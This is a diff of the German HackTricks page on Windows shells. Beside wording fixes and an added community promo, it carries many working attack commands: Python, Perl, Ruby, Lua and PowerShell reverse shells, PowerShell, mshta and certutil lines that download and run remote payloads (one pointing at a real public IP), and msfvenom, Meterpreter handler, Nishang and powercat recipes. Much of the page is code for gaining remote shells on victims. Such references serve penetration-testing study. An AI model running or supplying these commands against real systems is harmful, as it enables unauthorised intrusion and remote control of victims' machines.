@@ -7,12 +7,20 @@
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## Lolbas
 
@@ -39,7 +47,7 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 ## Python
 
-Python ist eine vielseitige Programmiersprache, die häufig von Hackern verwendet wird, um Shell-Zugriff auf Windows-Systeme zu erhalten. Python-Skripte können verwendet werden, um Reverse-Shells zu erstellen, die es Hackern ermöglichen, eine Verbindung zu einem entfernten System herzustellen und Befehle auszuführen. Python bietet auch Bibliotheken wie `socket` und `subprocess`, die bei der Erstellung von Shell-Skripten hilfreich sind.
+Python ist eine beliebte Programmiersprache für die Entwicklung von Shell-Skripten auf Windows-Systemen. Mit Python können Hacker leistungsstarke Skripte erstellen, um verschiedene Angriffe durchzuführen und Systeme zu kompromittieren. Es bietet eine Vielzahl von Bibliotheken und Funktionen, die das Erstellen von Schadcode erleichtern.
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
@@ -59,24 +67,26 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 
 Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.
 
-#### Shell
+To use Meterpreter on Windows, you can generate a payload using msfvenom and set up a handler to receive the connection. Once the payload is executed on the target system, you will have an interactive Meterpreter shell to perform various post-exploitation tasks.
 
-The shell is a simple command shell that will run on the target system. It is not as advanced as Meterpreter but gets the job done in most cases. It is a standalone Ruby script that can be run on the target system to provide a basic command shell.
+```plaintext
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > meterpreter_payload.exe
+```
 
-#### VNC
-
-VNC stands for Virtual Network Computing. It is a graphical desktop sharing system that uses the Remote Frame Buffer protocol to remotely control another computer. In Metasploit, VNC can be used to interact with the target system's desktop once access has been gained.
-
-#### RDP
-
-RDP stands for Remote Desktop Protocol. It is a proprietary protocol developed by Microsoft that allows a user to connect to another computer over a network connection. In Metasploit, RDP can be used to interact with the target system's desktop once access has been gained.
+```plaintext
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT <attacker_port>
+exploit
+```
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua ist eine leistungsstarke, effiziente und leichtgewichtige Skriptsprache, die häufig für die Entwicklung von Spielen und Anwendungen verwendet wird. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden und bieten eine einfache Integration in Anwendungen. Lua wird oft als eingebettete Skriptsprache verwendet, um die Funktionalität von Anwendungen zu erweitern.
+Lua ist eine leistungsstarke, effiziente, leichtgewichtige und eingebettete Skriptsprache. Lua wird häufig für die Erstellung von Skripten und Automatisierungsaufgaben in verschiedenen Anwendungen verwendet. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden und bieten eine flexible Möglichkeit, die Funktionalität von Anwendungen zu erweitern. Lua wird auch häufig in der Spieleentwicklung und anderen Bereichen eingesetzt, die eine schnelle und flexible Skriptunterstützung erfordern.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -104,12 +114,14 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Prozess, der Netzwerkanruf ausführt: **powershell.exe**\
-Payload auf Festplatte geschrieben: **NEIN** (_zumindest nirgendwo gefunden, als ich procmon verwendet habe!_)
+Payload auf Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich es mit procmon finden konnte!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
 Payload auf Festplatte geschrieben: **WebDAV-Client-Lokalcache**
+
+**Einzeiler:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -129,7 +141,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS-Backdoors)**
+#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS-Hintertür)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -282,7 +294,7 @@ Laden Sie eine B64dll herunter, decodieren Sie sie und führen Sie sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Laden Sie eine B64exe herunter, decodieren Sie sie und führen Sie sie aus.
+Lade eine B64exe herunter, dekodiere sie und führe sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -303,7 +315,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Prozess, der Netzwerkanruf durchführt: **svchost.exe**\
+Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
 Payload auf Festplatte geschrieben: **WebDAV-Client-Lokalcache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
@@ -393,17 +405,17 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Powershell Shells
+## Powershell-Shells
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Im **Shells**-Ordner gibt es viele verschiedene Shells. Um _Invoke-PowerShellTcp.ps1_ herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen Sie es am Ende der Datei hinzu:
+Im **Shells**-Ordner gibt es viele verschiedene Shells. Um _Invoke-PowerShellTcp.ps1_ herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen am Ende der Datei hinzu:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Starte den Skript auf einem Webserver und führe es auf dem Endgerät des Opfers aus:
+Starten Sie das Skript auf einem Webserver und führen Sie es auf der Seite des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -423,7 +435,7 @@ Defender erkennt es nicht als bösartigen Code (noch nicht, 3/04/2019).
 
 **Andere von Powercat angebotene Optionen:**
 
-Bind-Shells, Reverse-Shell (TCP, UDP, DNS), Portumleitung, Upload/Download, Payloads generieren, Dateien bereitstellen...
+Bind-Shell, Reverse-Shell (TCP, UDP, DNS), Portumleitung, Upload/Download, Payloads generieren, Dateien bereitstellen...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -462,7 +474,7 @@ Starte msfconsole mit der erstellten Ressource:
 ```
 msfconsole -r unicorn.rc
 ```
-Starte einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führe im Opfer aus:
+Starten Sie einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führen Sie auf dem Opfer aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -484,13 +496,19 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensi
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
-<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
